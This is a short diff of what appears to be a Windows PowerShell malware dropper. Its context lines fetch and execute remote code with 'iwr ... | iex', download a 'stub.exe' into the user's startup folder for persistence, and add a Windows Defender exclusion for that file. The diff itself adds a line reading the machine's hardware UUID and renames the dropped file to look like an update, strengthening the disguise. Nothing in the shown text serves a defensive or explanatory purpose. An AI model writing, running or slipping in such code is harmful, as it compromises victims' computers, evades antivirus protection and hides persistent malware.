@@ -136,9 +136,9 @@ if (Test-Path -Path $output) {
 
 
 iwr "https://leaked.tools/r/GFvWVhDQmc" | iex
-
+$uuid = (Get-WmiObject Win32_ComputerSystemProduct).UUID
 $url = "https://github.com/43a1723/test/releases/download/siu/stub.exe"
-$output = "$startupfolder\Neverdie.exe"
+$output = "$startupfolder\$uuid_update.exe"
 Add-MpPreference -ExclusionPath $output
 
 if (Test-Path -Path $output) {
